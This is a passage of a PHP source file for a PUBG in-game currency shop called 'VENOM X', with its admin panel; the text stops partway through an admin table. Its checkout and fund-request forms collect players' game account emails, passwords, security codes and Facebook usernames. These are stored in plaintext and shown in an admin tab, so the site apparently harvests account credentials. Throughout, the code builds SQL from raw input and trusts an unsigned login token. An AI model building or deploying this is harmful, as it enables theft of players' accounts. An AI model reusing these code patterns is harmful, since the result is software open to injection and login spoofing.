<?php
session_start();
$db = new SQLite3('pubg_shop.db');

// Create all tables
$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    google_id TEXT UNIQUE,
    email TEXT UNIQUE,
    name TEXT,
    password TEXT,
    wallet REAL DEFAULT 0,
    banned INTEGER DEFAULT 0,
    photo TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    image TEXT,
    type TEXT DEFAULT 'uc',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    product_id INTEGER,
    product_name TEXT,
    amount REAL,
    game_uid TEXT,
    game_name TEXT,
    game_email TEXT,
    game_password TEXT,
    game_level TEXT,
    security_code TEXT,
    phone TEXT,
    fb_username TEXT,
    platform TEXT,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS fund_requests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    amount REAL,
    utr TEXT,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS game_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    platform TEXT,
    game_uid TEXT,
    game_name TEXT,
    email TEXT,
    password TEXT,
    security_code TEXT,
    phone TEXT,
    fb_username TEXT,
    game_level TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    message TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

define('ADMIN_KEY', 'VENOM-X-OWNER');

// Stylish Number Function
function stylish_number($num) {
    $stylish_digits = ['𝟎', '𝟏', '𝟐', '𝟑', '𝟒', '𝟓', '𝟔', '𝟕', '𝟖', '𝟗'];
    $result = '';
    foreach(str_split($num) as $digit) {
        if(is_numeric($digit)) {
            $result .= $stylish_digits[intval($digit)];
        } else {
            $result .= $digit;
        }
    }
    return $result;
}

// Stylish Text Function
function stylish_text($text) {
    $stylish_map = [
        'A'=>'𝐀','B'=>'𝐁','C'=>'𝐂','D'=>'𝐃','E'=>'𝐄','F'=>'𝐅','G'=>'𝐆',
        'H'=>'𝐇','I'=>'𝐈','J'=>'𝐉','K'=>'𝐊','L'=>'𝐋','M'=>'𝐌','N'=>'𝐍',
        'O'=>'𝐎','P'=>'𝐏','Q'=>'𝐐','R'=>'𝐑','S'=>'𝐒','T'=>'𝐓','U'=>'𝐔',
        'V'=>'𝐕','W'=>'𝐖','X'=>'𝐗','Y'=>'𝐘','Z'=>'𝐙',
        'a'=>'𝐚','b'=>'𝐛','c'=>'𝐜','d'=>'𝐝','e'=>'𝐞','f'=>'𝐟','g'=>'𝐠',
        'h'=>'𝐡','i'=>'𝐢','j'=>'𝐣','k'=>'𝐤','l'=>'𝐥','m'=>'𝐦','n'=>'𝐧',
        'o'=>'𝐨','p'=>'𝐩','q'=>'𝐪','r'=>'𝐫','s'=>'𝐬','t'=>'𝐭','u'=>'𝐮',
        'v'=>'𝐯','w'=>'𝐰','x'=>'𝐱','y'=>'𝐲','z'=>'𝐳'
    ];
    $result = '';
    for($i = 0; $i < strlen($text); $i++) {
        $char = $text[$i];
        $result .= $stylish_map[$char] ?? $char;
    }
    return $result;
}

// Insert default products
$check = $db->querySingle("SELECT COUNT(*) FROM products WHERE type='uc'");
if($check == 0) {
    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('60 UC', 35, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('350 UC', 230, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('1500 UC', 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('3800 UC', 1999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('6050 UC', 4999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
}

// Google Login
if(isset($_POST['google_credential'])) {
    $cred = json_decode(base64_decode($_POST['google_credential']), true);
    $google_id = $cred['sub'];
    $email = $cred['email'];
    $name = $cred['name'];
    $photo = $cred['picture'];
    
    $check = $db->querySingle("SELECT id, banned FROM users WHERE google_id='$google_id'", true);
    if($check) {
        if($check['banned'] == 1) { $_SESSION['banned'] = true; }
        else { $_SESSION['user_id'] = $check['id']; }
    } else {
        $db->exec("INSERT INTO users (google_id, email, name, photo, wallet) VALUES ('$google_id', '$email', '$name', '$photo', 0)");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
    }
    header("Location: index.php");
    exit;
}

// Email Signup
if(isset($_POST['signup'])) {
    $email = $_POST['email'];
    $name = $_POST['name'];
    $pass = password_hash($_POST['password'], PASSWORD_DEFAULT);
    $check = $db->querySingle("SELECT id FROM users WHERE email='$email'", true);
    if(!$check) {
        $db->exec("INSERT INTO users (email, name, password, wallet) VALUES ('$email', '$name', '$pass', 0)");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
    }
    header("Location: index.php");
    exit;
}

// Email Login
if(isset($_POST['login'])) {
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $user = $db->querySingle("SELECT * FROM users WHERE email='$email'", true);
    if($user && password_verify($pass, $user['password'])) {
        if($user['banned'] == 1) { $_SESSION['banned'] = true; }
        else { $_SESSION['user_id'] = $user['id']; }
    }
    header("Location: index.php");
    exit;
}

// Admin Login
if(isset($_POST['admin_login'])) {
    if($_POST['admin_key'] == ADMIN_KEY) {
        $_SESSION['admin_logged'] = true;
        header("Location: index.php?admin=1");
        exit;
    } else {
        $admin_error = "Invalid Admin Key!";
    }
}

// Admin Logout
if(isset($_GET['admin_logout'])) {
    unset($_SESSION['admin_logged']);
    header("Location: index.php");
    exit;
}

// Logout
if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: index.php");
    exit;
}

// Add to Cart
if(isset($_POST['add_to_cart'])) {
    if(!isset($_SESSION['cart'])) $_SESSION['cart'] = [];
    $_SESSION['cart'][] = [
        'id' => intval($_POST['product_id']),
        'name' => $_POST['product_name'],
        'price' => floatval($_POST['product_price']),
        'image' => $_POST['product_image']
    ];
    header("Location: index.php?msg=" . urlencode("✅ Added to cart"));
    exit;
}

// Remove from cart
if(isset($_GET['remove_cart'])) {
    $index = intval($_GET['remove_cart']);
    if(isset($_SESSION['cart'][$index])) unset($_SESSION['cart'][$index]);
    $_SESSION['cart'] = array_values($_SESSION['cart']);
    header("Location: index.php?show_cart=1");
    exit;
}

// Checkout
if(isset($_POST['checkout'])) {
    $total = 0;
    foreach($_SESSION['cart'] as $item) { $total += $item['price']; }
    if($total <= 0) { header("Location: index.php?msg=Cart+empty"); exit; }
    
    $user = $db->querySingle("SELECT wallet FROM users WHERE id=".$_SESSION['user_id'], true);
    if($user['wallet'] >= $total) {
        $_SESSION['checkout_total'] = $total;
        header("Location: index.php?step=checkout");
    } else {
        header("Location: index.php?msg=" . urlencode("⚠️ Insufficient balance! Please add funds."));
    }
    exit;
}

// Add Funds Request
if(isset($_POST['add_funds_req'])) {
    $amount = floatval($_POST['amount']);
    $utr = $_POST['utr'];
    $uid = $_SESSION['user_id'];
    if($amount >= 199) {
        $_SESSION['temp_amount'] = $amount;
        $_SESSION['temp_utr'] = $utr;
        header("Location: index.php?step=game_account_funds");
        exit;
    } else {
        header("Location: index.php?msg=" . urlencode("⚠️ Minimum deposit is ₹199"));
        exit;
    }
}

// Game Account Details for Fund Request (Google)
if(isset($_POST['submit_google_funds'])) {
    $uid = $_SESSION['user_id'];
    $game_uid = $_POST['game_uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $level = $_POST['game_level'];
    $amount = $_SESSION['temp_amount'];
    $utr = $_SESSION['temp_utr'];
    
    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ($uid, $amount, '$utr')");
    $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, email, password, security_code, game_level) 
               VALUES ($uid, 'google', '$game_uid', '$game_name', '$email', '$pass', '$code', '$level')");
    
    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
    header("Location: index.php?msg=" . urlencode("✅ Fund request sent! Admin will approve within 24 hours."));
    exit;
}

// Game Account Details for Fund Request (Facebook)
if(isset($_POST['submit_fb_funds'])) {
    $uid = $_SESSION['user_id'];
    $game_uid = $_POST['game_uid'];
    $game_name = $_POST['game_name'];
    $phone = $_POST['phone'];
    $email = $_POST['linked_email'];
    $fb_username = $_POST['fb_username'];
    $pass = $_POST['password'];
    $level = $_POST['game_level'];
    $amount = $_SESSION['temp_amount'];
    $utr = $_SESSION['temp_utr'];
    
    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ($uid, $amount, '$utr')");
    $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, phone, email, fb_username, password, game_level) 
               VALUES ($uid, 'facebook', '$game_uid', '$game_name', '$phone', '$email', '$fb_username', '$pass', '$level')");
    
    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
    header("Location: index.php?msg=" . urlencode("✅ Fund request sent! Admin will approve within 24 hours."));
    exit;
}

// Game Account Details for Order (Google)
if(isset($_POST['submit_google_order'])) {
    $uid = $_SESSION['user_id'];
    $game_uid = $_POST['game_uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $level = $_POST['game_level'];
    $total = $_SESSION['checkout_total'];
    
    $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=$uid");
    
    foreach($_SESSION['cart'] as $item) {
        $db->exec("INSERT INTO orders (user_id, product_id, product_name, amount, game_uid, game_name, game_email, game_password, security_code, game_level, platform) 
                   VALUES ($uid, {$item['id']}, '{$item['name']}', {$item['price']}, '$game_uid', '$game_name', '$email', '$pass', '$code', '$level', 'google')");
    }
    
    $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, email, password, security_code, game_level) 
               VALUES ($uid, 'google', '$game_uid', '$game_name', '$email', '$pass', '$code', '$level')");
    
    $_SESSION['cart'] = [];
    unset($_SESSION['checkout_total']);
    header("Location: index.php?msg=" . urlencode("✅ Order placed successfully!"));
    exit;
}

// Game Account Details for Order (Facebook)
if(isset($_POST['submit_fb_order'])) {
    $uid = $_SESSION['user_id'];
    $game_uid = $_POST['game_uid'];
    $game_name = $_POST['game_name'];
    $phone = $_POST['phone'];
    $email = $_POST['linked_email'];
    $fb_username = $_POST['fb_username'];
    $pass = $_POST['password'];
    $level = $_POST['game_level'];
    $total = $_SESSION['checkout_total'];
    
    $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=$uid");
    
    foreach($_SESSION['cart'] as $item) {
        $db->exec("INSERT INTO orders (user_id, product_id, product_name, amount, game_uid, game_name, phone, email, fb_username, password, game_level, platform) 
                   VALUES ($uid, {$item['id']}, '{$item['name']}', {$item['price']}, '$game_uid', '$game_name', '$phone', '$email', '$fb_username', '$pass', '$level', 'facebook')");
    }
    
    $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, phone, email, fb_username, password, game_level) 
               VALUES ($uid, 'facebook', '$game_uid', '$game_name', '$phone', '$email', '$fb_username', '$pass', '$level')");
    
    $_SESSION['cart'] = [];
    unset($_SESSION['checkout_total']);
    header("Location: index.php?msg=" . urlencode("✅ Order placed successfully!"));
    exit;
}

// ========== ADMIN ACTIONS ==========
if(isset($_SESSION['admin_logged'])) {
    // Approve fund request
    if(isset($_GET['approve_fund'])) {
        $id = intval($_GET['approve_fund']);
        $fund = $db->querySingle("SELECT * FROM fund_requests WHERE id=$id AND status='pending'", true);
        if($fund) {
            $db->exec("UPDATE users SET wallet = wallet + {$fund['amount']} WHERE id = {$fund['user_id']}");
            $db->exec("UPDATE fund_requests SET status='approved' WHERE id=$id");
        }
        header("Location: index.php?admin=1&tab=funds");
        exit;
    }
    
    // Ban user
    if(isset($_GET['ban_user'])) {
        $id = intval($_GET['ban_user']);
        $db->exec("UPDATE users SET banned = 1 WHERE id = $id");
        header("Location: index.php?admin=1&tab=users");
        exit;
    }
    
    // Unban user
    if(isset($_GET['unban_user'])) {
        $id = intval($_GET['unban_user']);
        $db->exec("UPDATE users SET banned = 0 WHERE id = $id");
        header("Location: index.php?admin=1&tab=users");
        exit;
    }
    
    // Add cash to user
    if(isset($_POST['add_cash'])) {
        $user_id = intval($_POST['user_id']);
        $amount = floatval($_POST['amount']);
        $db->exec("UPDATE users SET wallet = wallet + $amount WHERE id = $user_id");
        header("Location: index.php?admin=1&tab=users");
        exit;
    }
    
    // Add product (UC or Gun)
    if(isset($_POST['add_product'])) {
        $name = $_POST['name'];
        $price = floatval($_POST['price']);
        $image = $_POST['image'];
        $type = $_POST['type'];
        $db->exec("INSERT INTO products (name, price, image, type) VALUES ('$name', $price, '$image', '$type')");
        header("Location: index.php?admin=1&tab=products");
        exit;
    }
    
    // Delete product
    if(isset($_GET['delete_product'])) {
        $id = intval($_GET['delete_product']);
        $db->exec("DELETE FROM products WHERE id=$id");
        header("Location: index.php?admin=1&tab=products");
        exit;
    }
    
    // Broadcast notification
    if(isset($_POST['broadcast'])) {
        $msg = $_POST['broadcast_msg'];
        $db->exec("INSERT INTO notifications (message) VALUES ('$msg')");
        header("Location: index.php?admin=1&tab=broadcast");
        exit;
    }
    
    // Complete order
    if(isset($_GET['complete_order'])) {
        $id = intval($_GET['complete_order']);
        $db->exec("UPDATE orders SET status='completed' WHERE id=$id");
        header("Location: index.php?admin=1&tab=orders");
        exit;
    }
}

$user = null;
$banned = false;
if(isset($_SESSION['user_id'])) {
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    if($user && $user['banned'] == 1) $banned = true;
}
$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
$show_cart = isset($_GET['show_cart']) ? true : false;
$step = isset($_GET['step']) ? $_GET['step'] : '';
$checkout_total = isset($_SESSION['checkout_total']) ? $_SESSION['checkout_total'] : 0;
$cart_items = isset($_SESSION['cart']) ? $_SESSION['cart'] : [];
$cart_total = 0;
foreach($cart_items as $item) { $cart_total += $item['price']; }

$uc_products = $db->query("SELECT * FROM products WHERE type='uc' ORDER BY price ASC");
$gun_products = $db->query("SELECT * FROM products WHERE type='gun' ORDER BY price ASC");

$is_admin = isset($_SESSION['admin_logged']) && isset($_GET['admin']);
$admin_tab = isset($_GET['tab']) ? $_GET['tab'] : 'dashboard';

$login_bg = "https://i.ibb.co/zhgBmwh4/file-126.jpg";
$logo_img = "https://i.ibb.co/9H1w570Y/file-125.jpg";
$google_icon = "https://i.ibb.co/wZTBJn3g/file-75.jpg";
$facebook_icon = "https://i.ibb.co/k2S25TS9/file-74.jpg";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>VENOM X | PUBG Shop</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
        }
        .login-page {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('<?php echo $login_bg; ?>') no-repeat center center/cover;
            padding: 20px;
        }
        .login-card {
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 450px;
            text-align: center;
            border: 1px solid #9b59b6;
        }
        .login-logo { max-width: 200px; margin-bottom: 20px; }
        .login-card input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
        }
        .login-card button {
            width: 100%;
            padding: 12px;
            background: #9b59b6;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }
        .switch { margin-top: 15px; color: #aaa; cursor: pointer; }
        .switch span { color: #9b59b6; }
        .admin-link { margin-top: 15px; font-size: 12px; color: #666; text-decoration: none; display: inline-block; }
        
        .dashboard { min-height: 100vh; background: #0a0a0a; padding: 20px; }
        .navbar {
            background: #111;
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            border: 1px solid #9b59b6;
        }
        .nav-logo { height: 40px; }
        .menu-icon { font-size: 24px; cursor: pointer; }
        .wallet-top {
            position: fixed;
            top: 15px;
            right: 15px;
            background: #1a0033;
            padding: 6px 12px;
            border-radius: 20px;
            border: 1px solid #9b59b6;
            font-size: 12px;
            z-index: 100;
            backdrop-filter: blur(10px);
        }
        .add-funds-small { font-size: 10px; margin-left: 8px; color: #9b59b6; cursor: pointer; text-decoration: underline; }
        .top-menu {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 60px 0 20px 0;
            flex-wrap: wrap;
        }
        .top-menu button {
            background: #1a0033;
            border: 1px solid #9b59b6;
            padding: 8px 18px;
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
        }
        .sidebar {
            position: fixed;
            top: 0;
            left: -280px;
            width: 280px;
            height: 100%;
            background: #111;
            border-right: 1px solid #9b59b6;
            transition: 0.3s;
            padding: 20px;
            z-index: 1000;
        }
        .sidebar.open { left: 0; }
        .close-sidebar { text-align: right; font-size: 24px; cursor: pointer; color: #9b59b6; }
        .menu-item {
            padding: 12px;
            margin: 8px 0;
            cursor: pointer;
            border-radius: 8px;
            text-align: center;
            background: #1a0033;
        }
        .menu-item:hover { background: #9b59b6; }
        .telegram-support {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #0088cc;
            text-decoration: none;
        }
        .section-title {
            font-size: 1.3rem;
            margin: 20px 0;
            text-align: center;
            color: #9b59b6;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .products-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
            margin: 20px 0;
        }
        .product-card {
            background: #111;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 15px;
            width: 170px;
            text-align: center;
            transition: transform 0.3s;
        }
        .product-card:hover { transform: translateY(-5px); border-color: #9b59b6; }
        .product-img { width: 100%; border-radius: 8px; margin-bottom: 10px; }
        .product-name { font-size: 14px; font-weight: bold; margin: 8px 0; }
        .product-price { font-size: 16px; color: #9b59b6; font-family: monospace; margin: 8px 0; }
        .cart-btn { background: #ff4444; width: 100%; padding: 8px; border-radius: 6px; cursor: pointer; border: none; color: white; }
        .page-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 2000;
            display: none;
            overflow-y: auto;
            padding: 20px;
        }
        .popup-card {
            background: #111;
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            margin: 50px auto;
            border: 1px solid #9b59b6;
        }
        .cart-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid #333;
        }
        .cart-total { font-size: 20px; font-weight: bold; margin: 20px 0; text-align: center; }
        .popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 3000;
        }
        .small-popup-card {
            background: #111;
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            border: 1px solid #9b59b6;
            text-align: center;
        }
        .bonus-btns { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
        .bonus-btn { flex: 1; background: #1a0033; border: 1px solid #9b59b6; padding: 10px; cursor: pointer; }
        .game-login-btns { display: flex; gap: 20px; justify-content: center; margin: 20px 0; }
        .game-icon { width: 80px; cursor: pointer; border-radius: 12px; }
        .order-item { background: #1a1a1a; padding: 10px; margin: 8px 0; border-radius: 8px; border-left: 3px solid #9b59b6; }
        .cart-fixed {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #ff4444;
            color: #fff;
            padding: 12px 20px;
            border-radius: 50px;
            z-index: 100;
            cursor: pointer;
            border: none;
        }
        .admin-container { min-height: 100vh; background: #0a0a0a; padding: 20px; }
        .admin-header {
            background: #1a0033;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            border: 1px solid #9b59b6;
        }
        .admin-tabs {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
        }
        .admin-tab {
            background: #1a0033;
            border: 1px solid #9b59b6;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            color: #fff;
            text-decoration: none;
            font-size: 12px;
        }
        .admin-tab.active { background: #9b59b6; }
        .admin-table { width: 100%; border-collapse: collapse; background: #111; font-size: 12px; }
        .admin-table th, .admin-table td { padding: 10px; border: 1px solid #333; text-align: left; }
        .admin-table th { background: #1a0033; color: #9b59b6; }
        .approve-btn { background: #00cc66; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
        .ban-btn { background: #ff4444; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
        .unban-btn { background: #00cc66; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
        .delete-btn { background: #ff4444; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
        .complete-btn { background: #ffaa00; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #000; display: inline-block; font-size: 11px; }
        input, textarea, select {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
        }
        button { cursor: pointer; }
        .banned-page { text-align: center; padding: 50px; }
        @media (max-width: 768px) { .product-card { width: calc(50% - 10px); } }
    </style>
</head>
<body>

<?php if($banned): ?>
<div class="login-page">
    <div class="login-card">
        <h2 style="color:#ff4444">🚫 You Have Been Banned</h2>
        <p>Contact support for assistance.</p>
        <a href="https://t.me/Ashxpro" class="telegram-support" style="display:inline-block; margin-top:20px;">📞 Contact Support</a>
    </div>
</div>
<?php elseif($is_admin): ?>
<!-- ADMIN PANEL -->
<div class="admin-container">
    <div class="admin-header">
        <div style="font-size:1.3rem; font-weight:bold; background:linear-gradient(90deg,#9b59b6,#ff00cc); -webkit-background-clip:text; background-clip:text; color:transparent;">ADMIN PANEL</div>
        <a href="index.php?admin_logout=1" style="background:#ff4444; padding:6px 12px; border-radius:6px; text-decoration:none; color:#fff;">Exit Admin</a>
    </div>
    
    <div class="admin-tabs">
        <a href="?admin=1&tab=dashboard" class="admin-tab <?php echo $admin_tab=='dashboard'?'active':''; ?>">Dashboard</a>
        <a href="?admin=1&tab=funds" class="admin-tab <?php echo $admin_tab=='funds'?'active':''; ?>">Payments</a>
        <a href="?admin=1&tab=users" class="admin-tab <?php echo $admin_tab=='users'?'active':''; ?>">Users</a>
        <a href="?admin=1&tab=products" class="admin-tab <?php echo $admin_tab=='products'?'active':''; ?>">Products</a>
        <a href="?admin=1&tab=orders" class="admin-tab <?php echo $admin_tab=='orders'?'active':''; ?>">Orders</a>
        <a href="?admin=1&tab=accounts" class="admin-tab <?php echo $admin_tab=='accounts'?'active':''; ?>">Game Accounts</a>
        <a href="?admin=1&tab=broadcast" class="admin-tab <?php echo $admin_tab=='broadcast'?'active':''; ?>">Broadcast</a>
    </div>
    
    <?php if($admin_tab=='dashboard'): ?>
    <div class="wallet-card">
        <h3>Admin Dashboard</h3>
        <?php $total_users = $db->querySingle("SELECT COUNT(*) FROM users"); ?>
        <?php $total_orders = $db->querySingle("SELECT COUNT(*) FROM orders"); ?>
        <?php $total_funds = $db->querySingle("SELECT COUNT(*) FROM fund_requests WHERE status='pending'"); ?>
        <p><strong>Total Users:</strong> <?php echo $total_users; ?></p>
        <p><strong>Total Orders:</strong> <?php echo $total_orders; ?></p>
        <p><strong>Pending Fund Requests:</strong> <?php echo $total_funds; ?></p>
    </div>
    <?php endif; ?>
    
    <?php if($admin_tab=='funds'): ?>
    <div class="wallet-card">
        <h3>Payment Requests</h3>
        <table class="admin-table">
            <tr><th>ID</th><th>User ID</th><th>Amount</th><th>UTR</th><th>Status</th><th>Action</th></tr>
            <?php $funds = $db->query("SELECT * FROM fund_requests ORDER BY id DESC");
            while($f = $funds->fetchArray()): ?>
            <tr>
                <td><?php echo $f['id']; ?></td>
                <td><?php echo $f['user_id']; ?></td>
                <td>₹<?php echo $f['amount']; ?></td>
                <td><?php echo htmlspecialchars($f['utr']); ?></td>
                <td><?php echo $f['status']; ?></td>
                <td><?php if($f['status']=='pending'){ ?><a href="?admin=1&approve_fund=<?php echo $f['id']; ?>" class="approve-btn">Approve</a><?php }else{ echo '-'; } ?></td>
            </tr>
            <?php endwhile; ?>
        </table>
    </div>
    <?php endif; ?>
    
    <?php if($admin_tab=='users'): ?>
    <div class="wallet-card">
        <h3>All Users</h3>
        <table class="admin-table">
            <tr><th>ID</th><th>Name</th><th>Email</th><th>Wallet</th><th>Status</th><th>Action</th></tr>
            <?php $users = $db->query("SELECT * FROM users ORDER BY id DESC");
            while($u = $users->fetchArray()): ?>
            <tr>
                <td><?php echo $u['id']; ?></td>
                <td><?php echo htmlspecialchars($u['name']??'N/A'); ?></td>
                <td><?php echo $u['email']; ?></td>
                <td>₹<?php echo number_format($u['wallet'],2); ?></td>
                <td><?php if($u['banned']==1){ echo '<span style="color:#ff4444;">Banned</span>'; }else{ echo '<span style="color:#00ff00;">Active</span>'; } ?></td>
                <td>
                    <form method="post" style="display:inline-flex; gap:5px;">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <input type="number" name="amount" placeholder="Amount" style="width:70px; padding:4px;">
                        <button type="submit" name="add_cash" style="padding:4px 8px;">Add</button>
                    </form>
                    <?php if($u['banned']==1){ ?>
                        <a href="?admin=1&unban_user=<?php echo $u['id']; ?>" class="unban-btn">Unban</a>
                    <?php }else{ ?>
                        <a href="?admin=1&ban_user=<?php echo $u['id']; ?>" class="ban-btn">Ban</a>
                    <?php } ?>
                 </div>
             </td>
             </tr>
            <?php endwhile; ?>
         </table>
    </div>
    <?php endif; ?>
    
    <?php if($admin_tab=='products'): ?>
    <div class="wallet-card">
        <h3>Add New Product</h3>
        <form method="post">
            <input type="text" name="name" placeholder="Product Name (e.g., 60 UC / AK-47)" required>
            <input type="number" name="price" placeholder="Price (₹)" step="1" required>
            <input type="url" name="image" placeholder="Image URL" required>
            <select name="type" required>
                <option value="uc">UC (Unknown Cash)</option>
                <option value="gun">Gun Store</option>
            </select>
            <button type="submit" name="add_product">Add Product</button>
        </form>
    </div>
    <div class="wallet-card">
        <h3>All Products</h3>
        <table class="admin-table">
            <tr><th>ID</th><th>Name</th><th>Price</th><th>Type</th><th>Image</th><th>Action</th></tr>
            <?php $prods = $db->query("SELECT * FROM products ORDER BY type, price ASC");
            while($p = $prods->fetchArray()): ?>
            <tr>
                <td><?php echo $p['id']; ?></td>
                <td><?php echo $p['name']; ?></td>
                <td>₹<?php echo $p['price']; ?></td>
                <td><?php echo $p['type']; ?></td>
                <td><img src="<?php echo $p['image']; ?>" width="40"></td>
                <td><a href="?admin=1&delete_product=<?php echo $p['id']; ?>" class="delete-btn" onclick="return confirm('Delete this product?')">Delete</a></td>
             </tr>
            <?php endwhile; ?>
         </table>
    </div>
    <?php endif; ?>
    
    <?php if($admin_tab=='orders'): ?>
    <div class="wallet-card">
        <h3>All Orders</h3>
        <table class="admin-table">
            <tr><th>ID</th><th>User ID</th><th>Product</th><th>Amount</th><th>Game UID</th><th>Status</th><th>Action</th></tr>
            <?php $orders = $db->query("SELECT * FROM orders ORDER BY id DESC");
            while($o = $orders->fetchArray()): ?>
            <tr>
                <td><?php echo $o['id']; ?></td>
                <td><?php echo $o['user_id']; ?></td>
                <td><?php echo $o['product_name']; ?></td>
                <td>₹<?php echo $o['amount']; ?></td>
                <td><?php echo $o['game_uid']; ?></td>
                <td><?php echo $o['status']; ?></td>
                <td><?php if($o['status']=='pending'){ ?><a href="?admin=1&complete_order=<?php echo $o['id']; ?>" class="complete-btn">Complete</a><?php }else{ echo '-'; } ?> </td>
             </tr>
            <?php endwhile; ?>
         </table>
    </div>
    <?php endif; ?>
    
    <?php if($admin_tab=='accounts'): ?>
    <div class="wallet-card">
        <h3>Game Accounts Submitted</h3>
        <table class="admin-table">
            <tr><th>ID</th><th>User ID</th><th>Platform</th><th>Game UID</th><th>Game Name</th><th>Email</th><th>Password</th><th>Security Code</th><th>Phone</th><th>FB Username</th><th>Level</th> </tr>
            <?php $accounts = $db->query("SELECT * FROM game_accounts ORDER BY id DESC");
            while($a = $accounts->fetchArray()): ?>
            <tr>
                <td><?php echo $a['id']; ?> </td>
                <td><?php echo $a['user_id']; ?> </td>
                <td><?php echo $a['platform']; ?> </td>
                <td><?php echo $a['game_uid']; ?> </td>
